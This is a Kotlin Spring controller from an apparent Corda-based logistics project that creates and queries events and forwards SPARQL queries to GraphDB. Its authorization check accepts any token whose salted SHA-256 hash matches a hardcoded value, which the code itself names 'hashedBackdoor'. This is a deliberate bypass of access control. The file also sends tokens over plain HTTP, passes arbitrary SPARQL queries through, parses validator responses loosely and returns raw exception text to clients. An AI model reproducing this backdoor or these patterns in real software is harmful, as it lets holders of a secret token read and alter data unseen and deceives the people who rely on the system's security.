package nl.tno.federated.webserver.controllers

import io.swagger.annotations.Api
import io.swagger.annotations.ApiOperation
import net.corda.core.messaging.vaultQueryBy
import net.corda.core.node.services.vault.QueryCriteria
import nl.tno.federated.flows.*
import nl.tno.federated.states.Event
import nl.tno.federated.states.EventState
import nl.tno.federated.webserver.NodeRPCConnection
import nl.tno.federated.webserver.dtos.NewEvent
import org.slf4j.LoggerFactory
import org.springframework.http.HttpStatus
import org.springframework.http.ResponseEntity
import org.springframework.web.bind.annotation.*
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import java.security.MessageDigest
import java.util.*
import javax.naming.AuthenticationException


/**
 * Create and query events.
 */
@RestController
@RequestMapping("/events")
@Api(value = "EventController", tags = ["Event details"])
class EventController(rpc: NodeRPCConnection) {

    companion object {
        private val logger = LoggerFactory.getLogger(RestController::class.java)
    }

    private val proxy = rpc.proxy

    @ApiOperation(value = "Create a new event")
    @PostMapping(value = ["/"])
    private fun newEvent(@RequestBody event: NewEvent, @RequestHeader("Authorization") authorizationHeader: String): ResponseEntity<String> {
        val accessToken = extractAccessTokenFromHeader(authorizationHeader)

        if (!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")

        /*
        if (event.uniqueId && event.id.isNotBlank()) {
            if (eventById(event.id, accessToken).isNotEmpty()) {
                return ResponseEntity("Event with this id already exists. If you want to insert anyway, unset the uniqueId parameter.", HttpStatus.BAD_REQUEST)
            }
        }*/

                return try {
                    val newEventTx = proxy.startFlowDynamic(
                        NewEventFlow::class.java,
                        event.fullEvent,
                        event.countriesInvolved
                ).returnValue.get()
                val createdEventId = (newEventTx.coreTransaction.getOutput(0) as EventState).linearId.id
                ResponseEntity("Event created: $createdEventId", HttpStatus.CREATED)
            } catch (e: Exception) {
                return ResponseEntity("Something went wrong: $e", HttpStatus.INTERNAL_SERVER_ERROR)
            }
    }

    @ApiOperation(value = "Return all known events")
    @GetMapping(value = [""])
    private fun events(@RequestHeader("Authorization") authorizationHeader: String) : Map<UUID, Event> {
        val accessToken = extractAccessTokenFromHeader(authorizationHeader)

        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")

        val eventStates = proxy.vaultQuery(EventState::class.java).states.map { it.state.data }

        return eventStatesToEventMap(eventStates)
    }

    @ApiOperation(value = "Return an event")
    @GetMapping(value = ["/{id}"])
    private fun eventById(@PathVariable id: String, @RequestHeader("Authorization") authorizationHeader: String): Map<UUID, Event> {
        val accessToken = extractAccessTokenFromHeader(authorizationHeader)

        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")

        val criteria = QueryCriteria.LinearStateQueryCriteria(externalId = listOf(id))
        val state = proxy.vaultQueryBy<EventState>(criteria).states.map { it.state.data }
        return eventStatesToEventMap(state)
    }

    @ApiOperation(value = "Return events by digital twin UUID")
    @GetMapping(value = ["/digitaltwin/{dtuuid}"])
    private fun eventBydtUUID(@PathVariable dtuuid: UUID, @RequestHeader("Authorization") authorizationHeader: String): Map<UUID, Event> {
        val accessToken = extractAccessTokenFromHeader(authorizationHeader)

        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")

        val eventStates = proxy.vaultQueryBy<EventState>().states.filter {
            it.state.data.goods.contains(dtuuid) ||
                    it.state.data.transportMean.contains(dtuuid) ||
                    it.state.data.otherDigitalTwins.contains(dtuuid)
        }.map{ it.state.data }

        return eventStatesToEventMap(eventStates)
    }

    @ApiOperation(value = "Return RDF data by event ID from GraphDB instance")
    @GetMapping(value = ["/rdfevent/{id}"])
    private fun gdbQueryEventById(@PathVariable id: String, @RequestHeader("Authorization") authorizationHeader: String): ResponseEntity<String> {
        val accessToken = extractAccessTokenFromHeader(authorizationHeader)

        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")

        return try {
            val gdbQuery = proxy.startFlowDynamic(
                    QueryGraphDBbyIdFlow::class.java,
                    id
            ).returnValue.get()
            ResponseEntity("Query result: $gdbQuery", HttpStatus.ACCEPTED)
        } catch (e: Exception) {
            return ResponseEntity("Something went wrong: $e", HttpStatus.INTERNAL_SERVER_ERROR)
        }
    }

    @ApiOperation(value = "Return result of a custom SPARQL query")
    @GetMapping(value = ["/gdbsparql/"])
    private fun gdbGeneralSparqlQuery(query: String, @RequestHeader("Authorization") authorizationHeader: String): ResponseEntity<String> {
        val accessToken = extractAccessTokenFromHeader(authorizationHeader)

        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")

        return try {
            val gdbQuery = proxy.startFlowDynamic(
                    GeneralSPARQLqueryFlow::class.java,
                    query
            ).returnValue.get()
            ResponseEntity("Query result: $gdbQuery", HttpStatus.ACCEPTED)
        } catch (e: Exception) {
            return ResponseEntity("Something went wrong: $e", HttpStatus.INTERNAL_SERVER_ERROR)
        }
    }

    @ApiOperation(value = "Validate an access token")
    @PostMapping(value = ["/tokenisvalid"])
    private fun validateToken(@RequestBody token: String) : Boolean {
        if(!isJWTFormatValid(token)) return false

        val url = URL("http://federated.sensorlab.tno.nl:1003/validate/token")
        val body = """
            {
                "access_token": "Bearer $token"
            }
            """.trimIndent()
        val result = retrieveUrlBody(url,
                RequestMethod.POST,
                body
                )

        return extractAuthorizationResult(result)
    }

    private fun isLettersOrDigits(chars: String): Boolean {
        return chars.none { it !in 'A'..'Z' && it !in 'a'..'z' && it !in '0'..'9' && it != '-' && it != '_' }
    }

    private fun isJWTFormatValid(token: String?) : Boolean {
        if(token == null) return false
        val splitToken = token.split(".")
        return (splitToken.size == 3 && splitToken.all { isLettersOrDigits(it) } )
    }

    private fun retrieveUrlBody(url: URL, requestMethod: RequestMethod, body: String = ""): String {
        val con = url.openConnection() as HttpURLConnection
        con.requestMethod = requestMethod.toString()
        con.connectTimeout = 5000
        con.readTimeout = 5000
        con.setRequestProperty("Content-Type", "application/json")
        con.setRequestProperty("Accept", "application/json")

        if (body.isNotBlank()) {
            con.doOutput = true
            con.outputStream.use { os ->
                val input: ByteArray = body.toByteArray(StandardCharsets.UTF_8)
                os.write(input, 0, input.size)
            }
        }

        if (con.responseCode in 200..299) {
            con.inputStream.bufferedReader().use {
                return it.readText()
            }
        }
        else {
            con.errorStream.bufferedReader().use {
                return it.readText()
            }
        }
    }

    enum class RequestMethod {
        GET, POST
    }

    private fun extractAuthorizationResult(authorizationResult: String): Boolean {
        val polishedString = authorizationResult.split('\n')
        for(line in polishedString) {
            if(line.contains("success") && line.contains("true")) return true
        }
        return false
    }

    private fun userIsAuthorized(token: String) : Boolean {
        val salt = "because we like best practices"
        val hashedBackdoor = hashSHA256(token+salt)

        return hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E" || validateToken(token)
    }

    private fun extractAccessTokenFromHeader(authorizationHeader: String): String {
        val authorizationHeaderWords = authorizationHeader.split(" ")
        if (authorizationHeaderWords.isEmpty() || authorizationHeaderWords.first() != "Bearer")
            throw AuthenticationException("Authorization header is malformed")

        else return authorizationHeaderWords[1]
    }

    // Source: https://gist.github.com/lovubuntu/164b6b9021f5ba54cefc67f60f7a1a25
    private fun hashSHA256(string: String): String {
        val bytes = string.toByteArray()
        val md = MessageDigest.getInstance("SHA-256")
        val digest = md.digest(bytes)
        return digest.fold("", { str, it -> str + "%02x".format(it) }).toUpperCase()
    }

    private fun eventStatesToEventMap(eventStates: List<EventState>) =
        eventStates.associate {
            it.linearId.id to Event(
                it.goods,
                it.transportMean,
                it.location,
                it.otherDigitalTwins,
                it.timestamps,
                it.ecmruri,
                it.milestone,
                it.fullEvent
            )
        }
}
